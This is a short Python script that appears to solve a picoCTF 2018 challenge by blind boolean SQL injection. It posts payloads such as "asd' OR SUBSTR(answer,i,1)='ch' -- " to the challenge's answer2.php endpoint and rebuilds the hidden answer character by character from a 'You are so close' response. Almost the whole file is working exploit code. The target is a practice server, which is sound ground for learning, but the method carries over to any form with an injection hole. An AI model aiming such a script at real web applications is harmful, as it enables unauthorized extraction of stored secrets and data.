import requests
import string
import urllib

#asd' or answer like 'f%' -- 

url="http://2018shell1.picoctf.com:36052/answer2.php"

alphabet = string.ascii_letters+string.digits+"""_-+*!$@?#"""
print alphabet
flag='41'
for i in range(3,30):
	for ch in alphabet:
		s = "asd' OR SUBSTR(answer," + str(i) + ",1)='" + ch + "' -- "
		urllib.quote_plus(s)
		injection = {'answer':s}
		req = requests.post(url, injection)
		#print req .text
		if req.text.find("You are so close") >= 1:
			flag += ch
			print "[+] " + flag
			break
